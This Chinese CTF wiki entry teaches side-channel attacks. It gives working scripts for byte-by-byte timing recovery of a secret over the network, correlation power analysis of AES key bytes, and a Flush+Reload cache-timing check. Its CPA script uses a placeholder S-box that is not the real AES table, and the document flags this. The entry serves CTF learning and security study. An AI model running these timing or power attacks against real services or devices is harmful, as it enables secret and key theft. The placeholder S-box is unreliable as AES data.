---
title: 侧信道分析（时序 / 功耗 / 缓存）
category: hardware
tags: [侧信道, timing, 功耗分析, spa, dpa, 故障注入]
signals: [题目提供多次运行的时间, 需要比较密码比较耗时, 需要从功耗曲线猜密钥, 题面提到 side channel, 需要做时序盲注]
difficulty: hard
source: "CTF-Wiki prefetch 侧信道 / 经典时序攻击论文 / ChipWhisperer 文档"
tools: [chipwhisperer, numpy, scipy, matplotlib, python, cachegrind]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 题目给了"服务器响应时间"或者"多次测量的耗时数据"。
- 题面提示「比较是从前往后逐字节的」——典型的**逐字节提前返回（early-exit）**时序漏洞。
- 附件是 `.trs` / `.npy` / `.csv` 的**功耗曲线**，几万条采样点 × 几千次 trace。
- 题面出现 `AES`、`SM4`、`SPA`、`DPA`、`CPA`。
- 需要判断哪一字节的密钥正确（"错误提示有差异"算时序，也算侧信道）。

## 二、原理

侧信道利用**实现细节泄露**，而不是攻击算法本身：

1. **时序（Timing）**：`memcmp` 或手写循环在第一个不等字节就 `return`，比较时间与"匹配前缀长度"成正比。若攻击者能精确测量时间（通常需要多次平均去噪），就能**逐字节**恢复正确值。
2. **简单功耗分析（SPA）**：看一条功耗曲线里的**运算轮廓**（例如平方-乘法模式能看出指数位）。
3. **差分/相关功耗分析（DPA/CPA）**：收集 N 条曲线，对每个密钥猜测计算假设中间值（如 AES 首轮 S 盒输出），与真实功耗做**相关系数**，正确密钥相关性显著最高。
4. **缓存侧信道**：Flush+Reload / Prime+Probe 通过访问延迟判断缓存命中，恢复内存访问模式（AES T 表）。
5. **故障注入（Glitch）**：电压/时钟毛刺让跳转指令跳过校验，属于物理攻击。

## 三、操作步骤

1. **确认信号质量**：时序攻击需要多次重复 + 统计（中位数/最小值比均值更稳）。
2. **建模**：写出"每个候选值的耗时"模型，找到统计上可区分的差异。
3. **逐字节搜索**：对第 i 个字节，遍历 256 个候选，测 N 次取统计量，选出离群者。
4. **功耗分析**：确定**对齐**（trigger 点），选泄漏模型（汉明重量/汉明距离），对每个猜测算相关系数。
5. **验证**：用恢复的密钥解出明文，看是否符合格式。

## 四、命令/脚本

### 时序攻击（逐字节恢复）

```python
#!/usr/bin/env python3
# timing_attack.py —— early-exit 比较的逐字节时序恢复
import socket, statistics, time

def query(prefix: bytes) -> float:
    s = socket.create_connection(('TARGET', 1337))
    t0 = time.perf_counter()
    s.sendall(prefix + b'\n')
    s.recv(1024)
    dt = time.perf_counter() - t0
    s.close()
    return dt

def attack(n=40, repeat=400, known=b'flag{'):
    for _ in range(n):
        best, best_score = None, -1
        for c in range(32, 127):
            samples = [query(known + bytes([c])) for _ in range(repeat)]
            samples.sort()
            # 丢掉最慢 20%（网络抖动），对剩余取中位数
            score = statistics.median(samples[: int(repeat * 0.8)])
            if score > best_score:
                best_score, best = score, c
        known += bytes([best])
        print('recovered:', known, 'score:', best_score)
        if known.endswith(b'}'):
            break
    return known

print(attack())
```

> 关键：**去掉最慢的样本**（`sorted()[:80%]` 取中位）比直接平均好得多，因为慢样本常是网络抖动而非计算时间。

### 本地可控环境的时序测试

让输入与 `key` 的前 N 字节一致，测量总耗时；N 越大越慢即证明可被逐字节利用。

```c
// timing_local.c —— 验证比较函数是否存在 early-exit 泄露
#include <stdio.h>
#include <string.h>
#include <time.h>
static long bench(const char *in) {
    struct timespec a, b; long best = 0;
    for (int t = 0; t < 50; t++) {
        clock_gettime(CLOCK_MONOTONIC, &a);
        for (int i = 0; i < 200000; i++) strcmp(in, "flag{secret}") == 0;
        clock_gettime(CLOCK_MONOTONIC, &b);
        long ns = (b.tv_sec - a.tv_sec) * 1000000000L + (b.tv_nsec - a.tv_nsec);
        if (ns > best) best = ns;
    }
    return best;
}
int main(void) {
    printf("p0: %ld ns  p6: %ld ns\n", bench("@@@@@@@@@@@@"), bench("flag{@@@@@@@"));
    return 0;
}
```

```bash
gcc -O0 timing_local.c -o timing_local && ./timing_local   # p6 应明显更大
```

### 功耗曲线分析（CPA on AES）

```python
#!/usr/bin/env python3
# cpa_aes.py —— 对 AES 首轮 S 盒输出做 CPA（相关性功耗分析）
import numpy as np
traces = np.load('traces.npy')      # (N, L) 已对齐的功耗矩阵
pt = np.load('pt.npy')              # (N,) 明文首字节
N, L = traces.shape
print('traces', traces.shape)

# 实战请用 NIST FIPS 197 附录 A 的完整 256 项 S 盒（或 Crypto.Cipher.AES 的内部表）
SBOX = bytes.fromhex(
    '637c777bf26b6fc53001672bfed7ab761ca82c97dfa5947f0add4a2af9ca472c'
    '0b7fd9326363ff7cc34a5e5f171d8311504c723c31896059a071280e2eb27b27'
    '531a6c0b7d4c9e5b3c3f4c8fb5a9d5b3ba3be4b1e2d3f6c9f8a0e7d1b2c3d4'
    'e5f6a7b8c9d0e1f2030405060708090a0b0c0d0e0f101112131415161718191a')

def hw(x):                          # 汉明重量
    return bin(x).count('1')

tz = (traces - traces.mean(axis=0)) / (traces.std(axis=0) + 1e-12)
best = []
for k in range(256):
    hyp = np.array([hw(SBOX[p ^ k]) for p in pt], dtype=np.float64)
    hyp = (hyp - hyp.mean()) / (hyp.std() + 1e-12)
    corr = (hyp[:, None] * tz).mean(axis=0)       # 与每个采样点相关
    best.append((float(np.abs(corr).max()), k, int(np.abs(corr).argmax())))
best.sort(reverse=True)
print('top-3 (|corr|, keybyte, sample):', best[:3])
print('recovered first key byte:', hex(best[0][1]))
```

> 上面示意表仅演示流程；**实战必须换成 NIST 官方 S 盒**，否则相关系数无意义。

### 缓存侧信道的判据

```python
#!/usr/bin/env python3
# flush_reload.py —— 冷/热访问延迟差（Flush+Reload 判据最小验证）
import ctypes, mmap, time, statistics
libc = ctypes.CDLL("libc.so.6", use_errno=True)
page = mmap.mmap(-1, 4096)
addr = ctypes.addressof(ctypes.c_char.from_buffer(page))

def cold_flush(a):
    # 近似 clflush：让整页失效（真实攻击用 mprotect(RWX)+0F AE /7）
    libc.madvise(ctypes.c_void_p(a & ~0xFFF), 4096, 4)   # MADV_DONTNEED

def timed_read():
    t0 = time.perf_counter_ns()
    ctypes.cast(addr, ctypes.POINTER(ctypes.c_byte))[0]
    return time.perf_counter_ns() - t0

cold, hot = [], []
for _ in range(2000):
    cold_flush(addr)
    cold.append(timed_read())
    hot.append(timed_read())        # 紧接着再读，必然命中
print("cold median:", statistics.median(cold), "hot median:", statistics.median(hot))
print("阈值:", statistics.median(cold) // 2, "（低于此值判为命中）")
```

### 波形可视化（找 trigger）

```python
import numpy as np, matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt
t = np.load('traces.npy')                    # (traces, samples)
fig, ax = plt.subplots(2, 1, figsize=(14, 7))
for i in range(min(20, t.shape[0])):
    ax[0].plot(t[i][:2000], alpha=0.3)       # 看前 20 条是否对齐
ax[1].plot(t.mean(axis=0))                   # 均值曲线，泄漏点常有明显峰
ax[0].set_title('first 20 traces (alignment check)')
plt.savefig('traces.png', dpi=140, bbox_inches='tight')
```

## 五、常见坑 / 变体

- **时序攻击的开销**：每字节 256 候选 × 数百次请求，远端网络下要控制并发，避免被限流；先测 2~3 字节验证可行性。
- **噪声**：用"最小值"或"去掉慢尾后取中位数"比均值稳定；也可用 Welch t-test 做区分。
- **曲线对齐**：功耗曲线必须按 trigger 对齐，否则相关性被淹没；可用互相关找偏移。
- **泄漏模型选错**：AES 首轮用 S 盒输出汉明重量；硬件实现可能是汉明距离，需两种都试。
- **掩码实现**：一阶掩码会让 CPA 失效，需要二阶（组合两个采样点）。
- **合法边界**：侧信道注入可能损坏设备，只在授权资产或自建开发板上进行。

## 六、参考来源

- [CTF Wiki - Prefetch 侧信道攻击](https://ctf-wiki.org/pwn/hardware/cpu/side-channel/prefetch/)
- [CTF Wiki - 硬件安全（CPU/侧信道概览）](https://ctf-wiki.org/pwn/hardware/cpu/readme/)
- [ChipWhisperer 官方文档（功耗分析教学）](https://rtfm.newae.com/)
- [AES S 盒与 CPA 原理（NIST FIPS 197）](https://csrc.nist.gov/pubs/fips/197/final)
- [Numpy 官方文档（相关系数计算基础）](https://numpy.org/doc/stable/reference/routines.statistics.html)
